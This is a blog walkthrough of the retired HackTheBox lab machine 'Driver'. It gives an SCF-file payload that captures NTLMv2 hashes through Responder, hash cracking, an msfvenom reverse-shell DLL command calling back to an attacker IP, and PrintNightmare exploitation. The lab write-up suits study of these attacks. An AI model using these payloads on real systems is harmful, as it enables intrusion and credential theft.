
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content='This article is a writeup about a retired HacktheBox machine: Driver published on October 2, 2021 by MrR3boot. This box is rated as easy box the user part implies a "standard" password, a SCF file and Responder The root part is nudged by a few hints (box logo,printer on the foothold website) and implies the use of the CVE-2021-1675 and CVE-2021-34527 also know as PrintNightmare.' name="description"/>
<meta content="security, boot2root, HTB, SCF file attack, print nightmare" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="HTB: Driver" property="og:title"/>
<meta content='This article is a writeup about a retired HacktheBox machine: Driver published on October 2, 2021 by MrR3boot. This box is rated as easy box the user part implies a "standard" password, a SCF file and Responder The root part is nudged by a few hints (box logo,printer on the foothold website) and implies the use of the CVE-2021-1675 and CVE-2021-34527 also know as PrintNightmare.' property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2022/02/htb-driver.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2022-02-27 11:40:00+01:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="HTB" property="article:tag"/>
<meta content="SCF file attack" property="article:tag"/>
<meta content="print nightmare" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – HTB: Driver</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="https://discord.com/users/maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
<li>
<a class="sc-reddit" href="https://www.reddit.com/user/maaggick/" target="_blank">
<i class="fa-brands fa-reddit"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="htb-driver">HTB: Driver</h1>
<p>
      Posted on 27 Feb 2022 in <a href="../../category/security.html">security</a>

        • 3 min read
    </p>
</header>
<div>
<p><img alt="Driver Card" class="align-left" src="/media/2022.02/driver_card.png" width="262"/></p>
<p>This article is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/387">Driver</a> published on
October 2, 2021 by
<a href="https://www.hackthebox.com/home/users/profile/13531">MrR3boot</a>.
This box is rated as easy box the user part implies a "standard" password, a
<a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SCF file</a>
and <a href="https://github.com/lgandx/Responder">Responder</a>
The root part is nudged by a few hints (box logo,printer on the foothold
website) and implies the use of the CVE-2021-1675 and CVE-2021-34527 also know
as PrintNightmare.</p>
<h1>User</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. Only port 21 (FTP), 22 (SSH) and 80 with a HTTP
service are open.</p>
<div class="highlight"><pre><span></span><code>PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-10-21T22:20:07
|_  start_date: 2021-10-21T22:16:01
</code></pre></div>
<h2>Web</h2>
<p>The website on port 80 ask for a basic authentication.</p>
<blockquote>
<p>http://10.129.171.196 is requesting your username and password. The site says: “MFP Firmware Update Center. Please enter password for admin”</p>
</blockquote>
<p>We know that the user is admin and we try a few standard passwords: 'password'
'123456' and 'admin'. The latest one is working.</p>
<p>The website is offering to test printer Firmware.</p>
<p><img alt="MFP Firmware Update Center" class="image-process-article-image" src="/media/2022.02/derivatives/article-image/driver_01.png"/></p>
<h2>SCF file attack</h2>
<p>As mentionned on the Firmware update page:</p>
<blockquote>
<p>Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.</p>
</blockquote>
<p>As we know the testing team will review the file we can use a
<a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SCF file attack</a>
to grab the user NTLMv2 hash.</p>
<p>Our SCF file is the following:</p>
<div class="highlight"><pre><span></span><code>[Shell]
Command=2
IconFile=\\10.10.14.55\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
</code></pre></div>
<p>The responder we launched before uploading our "firmware" file grab the <code>tony</code>
user hash:</p>
<div class="highlight"><pre><span></span><code>└─$ sudo responder -I tun0                                                                                                                                                                                                             130 ⨯
&lt;SNIP&gt;
[SMB] NTLMv2-SSP Client   : 10.129.242.208
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:61dd54e51643d459:DFE0DC661F09DAFC004EC1844E9C4721:0101000000000000806B289471C6D7019A27EFE77C3A82220000000002000800350030004900410001001E00570049004E002D004A0053003900390048004F004D005800510052004A0004003400570049004E002D004A0053003900390048004F004D005800510052004A002E0035003000490041002E004C004F00430041004C000300140035003000490041002E004C004F00430041004C000500140035003000490041002E004C004F00430041004C0007000800806B289471C6D7010600040002000000080030003000000000000000000000000020000043273E6F56DF2738F8BCFF72F774D5270EEE087137EC21179464F2626C47E0800A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0035003500000000000000000000000000
</code></pre></div>
<h2>Cracking hash</h2>
<p>We run <code>hashcat</code> on it and grab <code>tony</code>'s password: <code>liltony</code>.</p>
<p>└─$ hashcat hash -m 5600 -a 0 /home/kali/tools/password_lists/rockyou.txt --show
TONY::DRIVER:61dd54e51643d459:dfe0dc661f09dafc004ec1844e9c4721:0101000000000000806b289471c6d7019a27efe77c3a82220000000002000800350030004900410001001e00570049004e002d004a0053003900390048004f004d005800510052004a0004003400570049004e002d004a0053003900390048004f004d005800510052004a002e0035003000490041002e004c004f00430041004c000300140035003000490041002e004c004f00430041004c000500140035003000490041002e004c004f00430041004c0007000800806b289471c6d7010600040002000000080030003000000000000000000000000020000043273e6f56df2738f8bcff72f774d5270eee087137ec21179464f2626c47e0800a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0035003500000000000000000000000000:liltony</p>
<p>Using <a href="https://github.com/Hackplayers/evil-winrm">evil winrm</a> we can connect to
the box using <code>tony</code> credentials and grab the user flag.</p>
<div class="highlight"><pre><span></span><code>└─$ ./evil-winrm.rb -i 10.129.242.208 -u tony -p liltony                                                                                                                                                                                 1 ⨯

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

[0;31;49m*Evil-WinRM*[0m[0;33;49m PS [0mC:\Users\tony\Documents&gt; type ..\Desktop\user.txt
87900be0b26c6031b2cc4d8924950dc4
</code></pre></div>
<h1>Root</h1>
<p>Looking at the running services we see that the Spooler service is running. (Back
in October 2021, Print Nightmare was still the hypest vulnerability. Nobody had
looked at the <code>log4j</code> code yet.)</p>
<div class="highlight"><pre><span></span><code>[0;31;49m*Evil-WinRM*[0m[0;33;49m PS [0mC:\Users\tony\Documents&gt; Get-Service -Name Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler
</code></pre></div>
<p>A few Google searches lead us to a working <a href="https://github.com/ly4k/PrintNightmare">Print nightmare exploit</a>.</p>
<p>We generate a reverse shell DLL using msfvenom
<code>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.55 LPORT=4444 -f dll -o /tmp/rev.dll</code></p>
<p>We upload it using <code>evil winrm</code> and grab the root flag.</p>
<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\tony\Documents&gt; upload /tmp/rev.dll
Info: Uploading /tmp/rev.dll to C:\Users\tony\Documents\rev.dll

python3 printnightmare.py tony:liltony@10.129.95.238 -dll 'C:\Users\tony\Documents\rev.dll'

C:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
c520e29ba1ecb523a541fc28b75ed0b3
</code></pre></div>
<h1>Wrapping up</h1>
<p>The SCF file attack was great to exploit as this is not something I personally use
a lot. The print nightmare was really interesting as this (was) is one of the
biggest vulnerability of 2021.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/htb.html">HTB</a>
<a href="../../tag/scf-file-attack.html">SCF file attack</a>
<a href="../../tag/print-nightmare.html">print nightmare</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2022/02/htb-horizontall.html" title="HTB: Horizontall">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2022/03/htb-secret.html" title="HTB: Secret">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2024  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>